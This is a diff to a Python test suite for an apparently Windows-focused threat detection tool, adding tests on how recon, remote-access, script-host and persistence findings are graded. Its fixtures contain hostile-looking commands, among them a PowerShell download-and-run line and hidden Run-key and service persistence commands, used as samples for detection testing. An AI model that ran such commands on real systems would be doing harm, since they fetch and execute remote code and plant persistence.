@@ -64,11 +64,20 @@ def test_dual_use_finding_backed_by_a_high_finding_stays_strong():
     assert strengths(events, "recon_burst") == ["Strong"]
 
 
-def test_two_dual_use_findings_do_not_back_each_other_up():
+def test_two_different_dual_use_findings_in_one_chain_are_malicious():
+    # Recon + download-and-run by the same agent: two attack steps in one chain (gate rule 4).
     events = recon_from(AGENT) + [
         event(20, 1, "2026-02-01 09:00:05.000", ProcessGuid="{p}", ParentProcessGuid="{l}", Image=PS,
               ParentImage=AGENT, CommandLine="powershell -c iex (iwr https://scripts.example.com/a.ps1)")]
-    assert make_verdict(run_checks(events))["label"] == "Suspicious"
+    assert make_verdict(run_checks(events))["label"] == "Malicious"
+
+
+def test_two_findings_of_the_same_dual_use_kind_stay_low():
+    # Two recon bursts by the same agent are still one kind of action: Low.
+    later = [dict(e, record_id=e["record_id"] + 100, time=e["time"].replace("09:00", "11:00"))
+             for e in recon_from(AGENT)[1:]]
+    findings = run_checks(recon_from(AGENT) + later)
+    assert {f["strength"] for f in findings if f["check"] == "recon_burst"} == {"Weak"}
 
 
 def user_installed_rmm_recon():
@@ -363,6 +372,54 @@ def test_ransom_note_names_and_paths_with_spaces():
     assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\Public\\RESTORE_MY_FILES.txt"))
     assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\a\\Desktop\\HOW TO RECOVER.txt"))
     assert "ransom_note" not in checks_fired(opened("notepad.exe C:\\Program Files\\App\\readme.txt"))
+
+
+# ---------- new Low checks (policy: unsure = Suspicious) ----------
+
+def test_script_host_going_online_is_low():
+    def connect(image, ip, initiated="true"):
+        return [event(1, 3, "2026-02-01 09:00:00.000", ProcessGuid="{s}", Image=image,
+                      DestinationIp=ip, DestinationPort="443", Initiated=initiated)]
+    assert strengths(connect(PS, "93.184.216.34"), "script_host_online") == ["Weak"]
+    assert strengths(connect(SYS + "mshta.exe", "93.184.216.34"), "script_host_online") == ["Weak"]
+    assert "script_host_online" not in checks_fired(connect(PS, "10.0.0.5"))                 # private
+    assert "script_host_online" not in checks_fired(connect(PS, "93.184.216.34", "false"))   # incoming
+    assert "script_host_online" not in checks_fired(connect(SYS + "svchost.exe", "93.184.216.34"))
+
+
+def test_remote_access_tool_is_low_once_per_tool():
+    tool = "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe"
+    events = [event(n, 1, "2026-02-01 09:00:0%d.000" % n, ProcessGuid="{a%d}" % n, Image=tool) for n in (1, 2)]
+    assert strengths(events, "remote_access_tool") == ["Weak"]
+    assert "remote_access_tool" not in checks_fired([event(1, 1, "2026-02-01 09:00:00.000", Image=SYS + "mstsc.exe")])
+
+
+def run_key(writer, value):
+    return [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{w}", Image=writer,
+                  TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Example",
+                  Details=value)]
+
+
+def test_any_new_run_key_is_low_except_an_app_adding_itself():
+    app = "C:\\Program Files\\Example\\tray.exe"
+    assert "persistence" not in checks_fired(run_key(app, f'"{app}" --minimized'))           # adds itself
+    assert strengths(run_key(app, '"C:\\Program Files\\Other\\other.exe"'), "persistence") == ["Weak"]
+    assert strengths(run_key(SYS + "reg.exe", "powershell -w hidden -c iex $x"), "persistence") == ["Weak"]
+
+
+def service_set(value):
+    return [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{svc}", Image=SYS + "services.exe",
+                  TargetObject="HKLM\\System\\CurrentControlSet\\Services\\Example\\ImagePath", Details=value)]
+
+
+def test_any_new_service_outside_windows_is_low():
+    assert strengths(service_set('"C:\\Program Files\\Example\\svc.exe"'), "persistence") == ["Weak"]
+    assert strengths(service_set("%COMSPEC% /b /c start c:\\x.exe"), "persistence") == ["Weak"]
+    assert strengths(service_set("C:\\Windows\\System32\\cmd.exe /c x"), "persistence") == ["Weak"]
+    # Windows' own services, in any of the short forms Windows writes: no finding.
+    for windows in ("%SystemRoot%\\System32\\svchost.exe -k netsvcs", "\\SystemRoot\\System32\\drivers\\x.sys",
+                    "System32\\drivers\\y.sys", "C:\\Windows\\System32\\spoolsv.exe"):
+        assert "persistence" not in checks_fired(service_set(windows))
 
 
 def test_a_normal_it_day_is_not_malicious():
